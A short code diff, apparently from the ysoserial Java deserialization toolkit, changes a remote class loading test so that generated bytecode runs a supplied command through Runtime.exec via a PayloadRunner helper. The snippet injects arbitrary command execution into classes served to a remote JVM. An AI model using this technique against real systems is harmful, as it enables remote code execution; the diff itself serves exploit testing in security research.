@@ -12,6 +12,7 @@ import fi.iki.elonen.NanoHTTPD.Response.Status;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.test.WrappedTest;
 
 
@@ -54,7 +55,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
             pool.insertClassPath(new ClassClassPath(Exploit.class));
             final CtClass clazz = pool.get(Exploit.class.getName());
             clazz.setName(this.className);
-            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
+            clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(" + PayloadRunner.getCmd(command) + ");");
             return clazz.toBytecode();
         }
         catch ( Exception e ) {
